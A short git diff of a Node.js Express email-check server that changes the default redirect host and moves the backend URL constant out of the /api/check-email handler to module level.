@@ -12,7 +12,8 @@ const helmet = require('helmet');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://frontend-production-05bd.up.railway.app';
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app';
+const BACKEND_BASE = process.env.BACKEND_BASE || 'https://email-verification-app-production-8ea5.up.railway.app';
 
 let validEmails = new Set();
 let tokenMap = new Map();
@@ -88,9 +89,7 @@ app.post('/api/check-email', async (req, res) => {
   const encoded = Buffer.from(normalizedEmail).toString('base64');
   tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 }); // 5 min expiry
 
-  const BACKEND_BASE = process.env.BACKEND_BASE || `https://email-verification-app-production-8ea5.up.railway.app`;
   const redirectUrl = `${BACKEND_BASE}/forward?token=${token}`;
-
   return res.json({ valid: true, redirectUrl });
 });
 
